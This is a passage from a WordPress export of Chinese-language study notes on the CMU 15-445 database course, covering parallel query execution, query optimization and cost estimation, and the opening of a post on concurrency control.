<p>新型数据库大多采用这种模型，如DB2, MySQL, MSSQL。由数据库系统管理自身线程调度。使用这种处理模型的好处是上下文切换成本更低，而且无需管理共享内存。但某个线程出错可能会导致整个系统崩溃。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>注意：使用多线程模型不代表DBMS支持<code>intra-query parallelism</code></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220311100409.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>调度</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DBMS对拥有的线程进行调度：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>需要多少个worker</li><li>需要使用多少个CPU核心</li><li>指定任务运行在哪个CPU</li><li>什么时候存储输出</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>DBMS在任何时候都要比操作系统知道更多信息。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>并行查询</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>Inter-Query Parallelism</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>指同一时间可以同时执行多个不同的查询。可以增加吞吐量，减少延迟，使总体性能得到提升。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>如果任务以读取为主，这种模型只需要少量的同步操作。在需要频繁更新数据库的情况下，难以保证执行的正确性。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Intra-Query Parallelism</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>将一个查询拆分成多个子任务或片段，然后在不同的资源上同时并行执行这些任务。可以减少需要单个查询的延迟。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>比如进行<code>Join</code>操作时，多条线程可以同时构建Hash Table或对表进行搜索。对从查询树下方得到的数据进行分区，使用多个线程分别进行处理。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>将一个任务拆分成多个任务并执行完毕后，需要将执行结果合并。可以通过三种方式实现，这三种实现方法在同一个数据库系统中可以根据系统环境和查询组合使用。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Intra-Operator(Horizontal)</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>将一个任务（操作符）划分成多个独立的分段，由多个线程分别处理。DBMS会在查询计划中插入一个<code>exchange</code>操作，将执行完的分段合并起来。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220311101638.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":5} -->
<h5>Exchange操作符</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://docs.microsoft.com/zh-cn/archive/blogs/craigfr/the-parallelism-operator-aka-exchange">参考资料</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Exchange操作符有三种类型：Gather, Repartition, Distribute</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>Gather将从多个worker处得到的结果合并起来。</li><li>Repartition得到的结果重新划分为多个输出流。</li><li>Distribute将单个输入流划分为多个输出流。</li></ul>
<!-- /wp:list -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220311101713.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220311102001.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>Inter-Operator(Vertical)</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>多个不同的线程并发执行不同的操作符。但可能造成资源等待。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220311102109.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>垂直并发和水平并发可以同时使用。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Bushy Parallelism</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>将查询计划分为几个部分，交由不同的worker并发执行，最后进行Exchange。类似于上述两种并行方式的混合。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220311102237.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>I/O Parallelism</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果存储设备的I/O速度很慢，所有worker都被阻塞，那么并行就会变得没有意义。I/O并行尝试让多个存储设备以单个逻辑设备的形式来为数据库系统提供服务。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220311102354.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>Multi-disk Parallelism</h3>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>RAID0</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>器在多个磁盘中存取数据，RAID控制中保存元数据，告诉某一页位于哪个磁盘中。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220311102426.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>RAID1</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>所有磁盘都保存同样的信息，实现冗余备份。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220311102447.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>Database Partitioning</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>将数据库中的数据拆分为不相交的集合，然后将它们分配给离散的磁盘。DBMS可以指定每个数据库在磁盘上的存储位置。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在文件系统层面上，只要DBMS将各个数据库保存在不同目录中就可以实现。但如果一个事务可以同时更新多个数据库，可能仍然需要共享恢复日志文件。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Partitioning</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>将单个逻辑表划分为不相交的物理段，以便分开存储。这种划分最好是对应用透明的。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>垂直划分</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>将表的属性分割开保存到不同位置，需要保存元组信息以便重构原来的记录。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220311103115.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":5} -->
<h5>水平划分</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>根据某个键上的值对表格中的元组划分。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220311103146.png" alt=""/></figure>
<!-- /wp:image -->]]></content:encoded>
		<excerpt:encoded><![CDATA[本节介绍任意节点下的并行执行模型。]]></excerpt:encoded>
		<wp:post_id>300</wp:post_id>
		<wp:post_date><![CDATA[2022-03-11 10:37:48]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-03-11 02:37:48]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-03-11 10:40:35]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-03-11 02:40:35]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[12-query-execution-part-2]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="cmu-15-445-645"><![CDATA[CMU15-445/645]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[301]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[13 Query Planning & Optimization]]></title>
		<link>http://www.ironmanzzm.top/?p=307</link>
		<pubDate>Mon, 14 Mar 2022 01:45:20 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=307</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:heading -->
<h2>Query Optimization</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>查询优化主要有两种策略可以使用：</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Heuristics / Rules</h4>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><li>查询优化器中制订一些规则，当查询触发某个规则时重写查询计划，将愚蠢和低效率的东西（例如<code>0=1</code>）去除。</li><li>可能需要扫描catalog，即数据保存的格式，但不需要检查实际的数据。</li></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4>Cost-based Search</h4>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><li>使用一个模型来估算执行计划的开销</li><li>为同一个查询枚举多个查询计划，估算各个计划的开销，然后通过某种智能的方式选择开销最小的。</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>要进行准确的估算，有很大的难度。枚举所有查询计划同样非常困难，因为对于一个执行时间很短的查询，没有必要花费大量时间枚举它的查询计划。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Architecture</h2>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220313230211.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>SQL Rewriter(Optional)</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>对应用给出的SQL语句进行重写，只在分布式数据库系统中比较常见。例如SQL中给出一个名，重写器在表名上加上一些标记，包括该表存储在哪个结点之类的信息。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>SQL Parser</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>将SQL字符串转换为抽象语法树。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Binder</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>将SQL查询中引用的明明对象转换为某种内部标识符。这种绑定可以通过查找Catalog实现。Binder输出逻辑计划。逻辑计划是在高级层面指定如何执行查询，例如搜索哪张表、对哪两张表进行Join，但不会指定具体的搜索算法和Join算法。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Tree Rewriter(Optional)</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>制定一些静态规则对逻辑计划的语法树进行重写。这一步同样需要查找catalog。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Optimizer</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>优化器中使用模型对逻辑计划进行评估，并生成物理计划，即数据库实际执行查询的计划。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Heuristics</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>查询优化是数据库系统中最难的部分，是NP-Hard问题。目前有人开始尝试使用机器学习来改进优化器的准确率的效率。在2000年DB2已经开始尝试将基于机器学习的查询优化器集成到商业系统，称为Leo，但性能非常差。更多细节会在721中介绍。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>关系代数等价式</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果两个关系代数式产生两个相同的元组集合，则称这两个关系代数式是等价的。通过调整关系代数式中操作的顺序产生更高效的查询计划，这一步通常在<code>query rewriting</code>中完成。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>尽早进行过滤操作</li><li>对选择条件重新排序，先执行排除率高的操作</li><li>将复杂的条件分解为多个条件，并尽可能降成本低的操作下移</li><li>简化条件，例如(X=Y AND Y=3)可以替换为(X=3 AND Y=3)</li></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4>操作下移</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>常见的优化方式是将过滤操作放到Join操作之前，过滤后参与到Join中的元组数量更少，效率更高。但有时候过滤操作成本很高，在Join后产生的少量数据上作过滤效率更好，这时候是否下需要移由成本模型决定。大部分情况下都可以将过滤操作下移。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220313231029.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220313231106.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220313231239.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>逻辑计划优化</h3>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>分解复杂条件</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>当一个操作条件非常复杂时，不利于优化器将操作符下移。因此考虑将复杂的条件分解为简单条件，然后将操作移向下层。<br><img src="https://img.ironmanzzm.top/blog-img/20220313231601.png" alt=""><br><img src="https://img.ironmanzzm.top/blog-img/20220313231836.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>替换笛卡尔积</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>当笛卡尔积操作之后有过滤操作时，可以考虑将笛卡尔积和过滤替换为等价的<code>inner join</code><br>。<br><img src="https://img.ironmanzzm.top/blog-img/20220313232159.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220313232213.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>投影下移</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>下层向上层传递数据时，有些属性可能是没用的。因此可以通过添加投影操作，过滤掉上层不需要的属性。<br><img src="https://img.ironmanzzm.top/blog-img/20220313232343.png" alt=""><br><img src="https://img.ironmanzzm.top/blog-img/20220313232505.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Cost Estimation</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>一个有n个表参与的join操作，可能的排列顺序有<code>4^n</code>种（卡塔兰数），因此使用穷举法进行比较会非常慢。为了减少搜索空间，需要成本预估模型预估这些操作所需的工作量。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在成本估算模型中有以下三个假设：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>数据是均匀分布的</li><li>每个选择条件相互独立</li><li>join操作时，内表的每一个值在外表中都能找到对应。<br>这三个假设与实际情况会有出入，造成估算误差。第一个假设带来的问题可以通过<code>heavy hitter</code>方法解决。在一些高端数据库中，会对相关联的列进行统计，减少假设二带来的误差。</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>MongoDB中没有成本预估模型，实际操作时会同时运行多个不同的查询计划，哪个先返回就取哪一个。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Statistics</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DBMS在内部catalog中保存表的统计数据、属性和索引。这些统计数据需要定期进行更新。statistics catalog是数据库做成本估计的基础模块。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>对于每一个关系R，DBMS维护以下这些信息：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>N：R中元组的数量</li><li>V(A, R): 每个属性中不相同的值的数量</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>根据上述两个信息，可以定义一个<strong>选择基数</strong><code>SC(A, R) = N / V(A, R)</code>，即每个可能取到的值会出现的平均次数。这个函数假设数据是均匀的。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Plan Cost Estimation</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>成本估计需要考量CPU、磁盘、内存，对于分布式数据库还需要考虑网络等因素。面向磁盘的数据库中I/O是数据库的主要瓶颈，磁盘和内存的处理速度相差400倍。因此会考虑采用CPU和内存占用率更高的算法减少I/O次数。但对于内存数据库，由于不涉及外存I/O，又会希望CPU和内存占用率尽可能低。通常来说，由于各个系统硬件规格不一，我们将查询需要访问的元组数量作为成本中的参考值。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>通过选择基数估算每个操作符之间传递的元组数量。当我们在一个unique键上操作时，很容易知道V(A, R)为1，这时候估算比较简单。但是当我们进行复杂操作，例如范围查询、交并集等时，就需要特别的方式。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>基于选择基数，我们可以计算出某个条件的选择率（sel），即表中符合条件的元组占比。注意这些估算通常会低估。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>A = constant时：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>sel(A=constant) = SC(A, R) / N</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220314003122.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>A &gt;= constant时：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>sel(A&gt;=a) = (A_max - a + 1) / (A_max - A_min + 1)</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220314003235.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>not P:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>sel(not P) = 1 - sel(P) </code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220314003301.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>由于上述估算方法都是基于概率的，因此可以通过概率方法将他们组合成更复杂的公式。例如两个条件取交集或并集后的选择率，通常我们假设各个选择率之间是独立的。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>组合条件的选择率计算</h4>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220314003356.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220314003516.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>优化措施</h4>
<!-- /wp:heading -->

<!-- wp:heading {"level":5} -->
<h5>直方图</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了统计每个值出现的次数，最简单的方法是每个特定的值出现的次数都以直方图的形式保存下来。但是当数据量特别大的时候，statistics的大小也会随之增大。为了节省一部分内存空间，可以将相邻的n个值的出现次数相加，以等宽直方图或等高直方图两种方式保存。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>等宽直方图</strong><br><img src="https://img.ironmanzzm.top/blog-img/20220314085703.png" alt=""><br><strong>等高直方图</strong><br><img src="https://img.ironmanzzm.top/blog-img/20220314085750.png" alt=""><br><img src="https://img.ironmanzzm.top/blog-img/20220314085847.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>sketch</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://en.wikipedia.org/wiki/Count%E2%80%93min_sketch">Count-Min Sketch(1988)</a><br><a href="https://en.wikipedia.org/wiki/HyperLogLog">HyperLogLog(2007)</a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>采样法</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>另外，可以通过采样统计方法得到统计信息。从表中随机抽取一部分作为样本，在样本上计算出选择率用作成本估计。数据库定期刷新抽取的样本。如何抽取样本是一个值得探究的问题。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>SQL Server将两种方法都结合起来，实际效果表明效果很好。当查询比较简单，系统估计运行时间不长时，直接使用直方图法。若系统估计运行时间会较长，则会花费额外的时间进行采样估计。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Join操作的结果集大小估算</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>给定两个表R和S，返回结果集的大小有可能是多少？我们假设内表中的值都会在外表中出现。<br><img src="https://img.ironmanzzm.top/blog-img/20220314004345.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Plan Enumeration</h3>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>Simple-relation Query Planning</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>OLTP查询的查询计划制定是相对比较容易的，因为通常都Sargable(Search Argument Able)。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>只需找到选择率最高的索引</li><li>通常情况下都是在外键上执行Join</li><li>可以采用启发式方法</li></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4>Multi-relation Query Planning</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>但是随着参与Join操作的表的数量增加，可选的计划也随之剧增。1970年IBM的技术人员提出了<em>动态编程</em>，通过将大问题分解为小问题，以简化问题规模。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Candidate Plan Example</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>通过以下四步产生候选计划集合：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>枚举关系顺序</li><li>枚举Join算法</li><li>枚举访问方式</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>当涉及的表不多时，PostgresSQL采用动态编程的方法。当表比较多时，会采用遗传算法。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220314090659.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220314092727.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220314092747.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>Nested Sub-queries</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>可以采取两种方法对嵌套子查询进行优化：</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>重写法</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>将查询重写，对查询进行扁平化。<br><img src="https://img.ironmanzzm.top/blog-img/20220313232645.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>分解查询法</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>将子查询分解出来作为一个单独的查询，将结果存储为临时表供外部查询使用。<br><img src="https://img.ironmanzzm.top/blog-img/20220313232743.png" alt=""><br><img src="https://img.ironmanzzm.top/blog-img/20220313232911.png" alt=""></p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[查询优化器是SQL Server针对用户的请求进行内部优化，生成（或重用）执行计划并传输给存储引擎来操作数据，最终返回结果给用户的组件。查询优化器是关系型数据库管理系统的核心之一，决定对特定的查询使用哪些索引、哪些关联算法、从而使其高效运行，它是优化器中最重要的组件之一。]]></excerpt:encoded>
		<wp:post_id>307</wp:post_id>
		<wp:post_date><![CDATA[2022-03-14 09:45:20]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-03-14 01:45:20]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-03-14 09:49:56]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-03-14 01:49:56]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[13-query-planning-optimization]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="cmu-15-445-645"><![CDATA[CMU15-445/645]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e6%8a%80%e6%9c%af"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[308]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[14 Concurrency Control Theory]]></title>
		<link>http://www.ironmanzzm.top/?p=319</link>
		<pubDate>Fri, 20 May 2022 12:30:43 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=319</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:heading -->
<h2>并发控制协议</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>并发控制和恢复组件是DBMS架构中的重要组成部分，保证了多个事务之间并发执行的正确性和遇到异常后可以数据不丢失。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220322092019.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
